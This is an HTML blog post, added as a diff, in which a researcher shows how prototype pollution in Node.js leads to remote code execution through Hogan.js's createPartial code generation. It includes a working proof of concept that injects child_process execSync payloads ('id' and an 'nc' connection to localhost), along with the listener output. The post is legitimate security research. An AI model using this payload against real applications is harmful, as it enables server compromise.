@@ -1,0 +1,179 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>RCE via Twitter Hogan.js | 1n73rc3p70r-B10g | Welcome to MY Blog</title>
+
+  
+  <meta name="author" content="Sayooj B Kumar">
+  
+
+  
+  <meta name="description" content="place where i post my findings,ctf write-ups">
+  
+
+  
+  
+  <meta name="keywords" content="Prototype_Pollution,Hogan_js,Bugs">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="RCE via Twitter Hogan.js"/>
+
+  <meta property="og:site_name" content="1n73rc3p70r-B10g"/>
+
+  
+  <meta property="og:image" content="/blog/favicon.ico"/>
+  
+
+  <link href="/blog/favicon.ico" rel="icon">
+  <link rel="alternate" href="/blog/atom.xml" title="1n73rc3p70r-B10g" type="application/atom+xml">
+  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/blog/">1n73rc3p70r-B10g</a>
+    </h1>
+    <p class="site-description">Welcome to MY Blog</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>RCE via Twitter Hogan.js</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/blog/2021/12/15/PP-Hogan-js/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-12-14T18:30:00.000Z">
+          2021-12-15
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><strong>tl;dr</strong></p>
+<ul>
+<li>Reversing Hogan.js</li>
+<li>RCE - using Hogan-js<span id="more"></span></li>
+</ul>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In this Blog i will be explaining how i gained RCE using <a target="_blank" rel="noopener" href="https://github.com/twitter/hogan.js">Twitter Hogan.js</a> when Prototype Pollution exists.</p>
+<p>Few days back Michał Bentkowski released a server side prototype pollution <a target="_blank" rel="noopener" href="https://air-pollution.challenge.ctf.expert/">challenge</a>where RCE is required to get flag all we have is Prototype Pollution , which reminds me of <a target="_blank" rel="noopener" href="https://blog.p6.is/AST-Injection/">AST-Injection</a></p>
+<p>I started looking through the challenge and suddenly my eyes caught on Hogan.js which is used to compile the Mustache Templating language so I started looking into its source code.Even After checking them multiple times I couldn’t  find any chains that helps to gain RCE as per the challenge.But yeah I found a few lines that could be useful to gain RCE apart from challenge.</p>
+<p>In this blog I will be explaining how I was able to chain Prototype pollution to RCE via Hogan Js.<br>For those who need more information check this amazing Findings by <a target="_blank" rel="noopener" href="https://blog.p6.is/AST-Injection/">POSIX</a></p>
+<h2 id="Reversing-Hogan-js"><a href="#Reversing-Hogan-js" class="headerlink" title="Reversing Hogan.js"></a>Reversing Hogan.js</h2><p>In short, Hogan.codegen in <code>compiler.js</code> is responsible for code generation depending on the cases and later , this generated code gets executed.</p>
+<p>While going through each function and the way each builds the code by appending objects to Strings.Most of the objects where pre defined so Prototype Pollution is ineffective in such situations.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Hogan.codegen = &#123;</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">node, context</span>) </span>&#123;</span><br><span class="line">      context.code += <span class="string">&#x27;if(t.s(t.&#x27;</span> + chooseMethod(node.n) + <span class="string">&#x27;(&quot;&#x27;</span> + esc(node.n) + <span class="string">&#x27;&quot;,c,p,1),&#x27;</span> +</span><br><span class="line">                      <span class="string">&#x27;c,p,0,&#x27;</span> + node.i + <span class="string">&#x27;,&#x27;</span> + node.end + <span class="string">&#x27;,&quot;&#x27;</span> + node.otag + <span class="string">&quot; &quot;</span> + node.ctag + <span class="string">&#x27;&quot;))&#123;&#x27;</span> +</span><br><span class="line">                      <span class="string">&#x27;t.rs(c,p,&#x27;</span> + <span class="string">&#x27;function(c,p,t)&#123;&#x27;</span>;</span><br><span class="line">      Hogan.walk(node.nodes, context);</span><br><span class="line">      context.code += <span class="string">&#x27;&#125;);c.pop();&#125;&#x27;</span>;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;^&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">node, context</span>) </span>&#123;</span><br><span class="line">      context.code += <span class="string">&#x27;if(!t.s(t.&#x27;</span> + chooseMethod(node.n) + <span class="string">&#x27;(&quot;&#x27;</span> + esc(node.n) + <span class="string">&#x27;&quot;,c,p,1),c,p,1,0,0,&quot;&quot;))&#123;&#x27;</span>;</span><br><span class="line">      Hogan.walk(node.nodes, context);</span><br><span class="line">      context.code += <span class="string">&#x27;&#125;;&#x27;</span>;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;&#x27;</span>: createPartial,</span><br><span class="line">    <span class="string">&#x27;&lt;&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">node, context</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> ctx = &#123;<span class="attr">partials</span>: &#123;&#125;, <span class="attr">code</span>: <span class="string">&#x27;&#x27;</span>, <span class="attr">subs</span>: &#123;&#125;, <span class="attr">inPartial</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      Hogan.walk(node.nodes, ctx);</span><br><span class="line">      <span class="keyword">var</span> template = context.partials[createPartial(node, context)];</span><br><span class="line">      template.subs = ctx.subs;</span><br><span class="line">      template.partials = ctx.partials;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;$&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">node, context</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> ctx = &#123;<span class="attr">subs</span>: &#123;&#125;, <span class="attr">code</span>: <span class="string">&#x27;&#x27;</span>, <span class="attr">partials</span>: context.partials, <span class="attr">prefix</span>: node.n&#125;;</span><br><span class="line">      Hogan.walk(node.nodes, ctx);</span><br><span class="line">      context.subs[node.n] = ctx.code;</span><br><span class="line">      <span class="keyword">if</span> (!context.inPartial) &#123;</span><br><span class="line">        context.code += <span class="string">&#x27;t.sub(&quot;&#x27;</span> + esc(node.n) + <span class="string">&#x27;&quot;,c,p,i);&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">node, context</span>) </span>&#123;</span><br><span class="line">      context.code += write(<span class="string">&#x27;&quot;\\n&quot;&#x27;</span> + (node.last ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; + i&#x27;</span>));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;_v&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">node, context</span>) </span>&#123;</span><br><span class="line">      context.code += <span class="string">&#x27;t.b(t.v(t.&#x27;</span> + chooseMethod(node.n) + <span class="string">&#x27;(&quot;&#x27;</span> + esc(node.n) + <span class="string">&#x27;&quot;,c,p,0)));&#x27;</span>;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;_t&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">node, context</span>) </span>&#123;</span><br><span class="line">      context.code += write(<span class="string">&#x27;&quot;&#x27;</span> + esc(node.text) + <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#123;&#x27;</span>: tripleStache,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&amp;&#x27;</span>: tripleStache</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>But the function <code>createPartial</code> looks unsafe.When it comes to <code>context.prefix</code> and <code>node.indent</code> value is added if value exists else it keeps it as empty.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPartial</span>(<span class="params">node, context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prefix = <span class="string">&quot;&lt;&quot;</span> + (context.prefix || <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> sym = prefix + node.n + serialNo++;</span><br><span class="line">    context.partials[sym] = &#123;<span class="attr">name</span>: node.n, <span class="attr">partials</span>: &#123;&#125;&#125;;</span><br><span class="line">    context.code += <span class="string">&#x27;t.b(t.rp(&quot;&#x27;</span> +  esc(sym) + <span class="string">&#x27;&quot;,c,p,&quot;&#x27;</span> + (node.indent || <span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;&quot;));&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> sym;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>Yay!!! So Prototype Pollution can Pollute them but how is this function called by <code>Hogan.codegen</code> ?</p>
+<p>In Hogan.js there is something called <code>tokens</code> which is used to generate codes. Token can be extracted by following way.</p>
+<p>code</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> template = <span class="string">&quot;my &#123;&#123;&gt;example&#125;&#125; template.&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> tokens=hogan.scan(template)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;tokens&quot;</span>,tokens)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>Output</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tokens [</span><br><span class="line">  &#123; <span class="attr">tag</span>: <span class="string">&#x27;_t&#x27;</span>, <span class="attr">text</span>: [<span class="built_in">String</span>: <span class="string">&#x27;my &#x27;</span>] &#125;,</span><br><span class="line">  &#123; <span class="attr">tag</span>: <span class="string">&#x27;&gt;&#x27;</span>, <span class="attr">n</span>: <span class="string">&#x27;example&#x27;</span>, <span class="attr">otag</span>: <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="attr">ctag</span>: <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="attr">i</span>: <span class="number">15</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">tag</span>: <span class="string">&#x27;_t&#x27;</span>, <span class="attr">text</span>: [<span class="built_in">String</span>: <span class="string">&#x27; template.&#x27;</span>] &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>In tokens tags are used to call corresponding functions checking <code>Hogan.codegen</code> in this case tag : ‘&gt;’ calls <code>createPartial</code>.</p>
+<h2 id="Code-Execution"><a href="#Code-Execution" class="headerlink" title="Code Execution"></a>Code Execution</h2><p>Now we have Prototype Pollution that Successfully pollutes the generated codes but creating a working Exploit was a bit challenging.When I debugged generated code I came to the conclusion that directly adding “ to break the generated code returns bad syntax and ends executing.So my idea was to use <code>console.log</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(\<span class="string">&quot;));console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())//\&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>When <code>console.log(&quot;some string&quot;)</code> is used this ends as a function so no more bad syntax when Double quotes are used.<br>This is how the generated code looks like when it gets polluted with above exploit.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">t.b(<span class="string">&quot;my &quot;</span>);t.b(t.rp(<span class="string">&quot;&lt;abcdexample0&quot;</span>,c,p,<span class="string">&quot;console.log(&quot;</span>));<span class="built_in">console</span>.log(process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;id&#x27;</span>).toString())<span class="comment">//&quot;)&quot;));t.b(&quot; template.&quot;);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>Code</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hogan = <span class="built_in">require</span>(<span class="string">&quot;hogan.js&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// construct template string</span></span><br><span class="line"><span class="keyword">var</span> template = <span class="string">&quot;my &#123;&#123;&gt;example&#125;&#125; template.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Prototype Pollution</span></span><br><span class="line"><span class="title">constructor</span>.<span class="title">prototype</span>.<span class="title">indent</span>=&quot;<span class="title">console</span>.<span class="title">log</span>(<span class="params">\<span class="string">&quot;));console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;nc 127.0.0.1 1337&#x27;))//\&quot;)&quot;</span>;</span></span><br><span class="line"><span class="params">constructor.prototype.prefix=<span class="string">&quot;abcd&quot;</span>;</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"><span class="keyword">var</span> tokens=hogan.scan(template)</span></span><br><span class="line"><span class="params"><span class="built_in">console</span>.log(<span class="string">&quot;tokens&quot;</span>,tokens)</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"><span class="comment">// compile template</span></span></span><br><span class="line"><span class="params"><span class="keyword">var</span> compiled = hogan.compile(template);</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"><span class="built_in">console</span>.log(<span class="string">&quot;compiled&quot;</span> , compiled)</span></span><br><span class="line"><span class="params"><span class="keyword">var</span> s = compiled.render(&#123;example: <span class="string">&#x27;twitterer&#x27;</span> &#125;)</span></span><br><span class="line"><span class="params"><span class="built_in">console</span>.log(<span class="string">&quot;renderd&quot;</span>,s)</span></span><br><span class="line"><span class="params"></span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(sbk㉿kali)-[/media/sbk/1n73rc3p70r_B10g]</span><br><span class="line">└─$ nc -lvp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 59134</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/blog/categories/Web-Exploitation/">Web Exploitation</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/blog/tags/Prototype-Pollution/">Prototype_Pollution</a><a href="/blog/tags/Hogan-js/">Hogan_js</a><a href="/blog/tags/Bugs/">Bugs</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Sayooj B Kumar
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
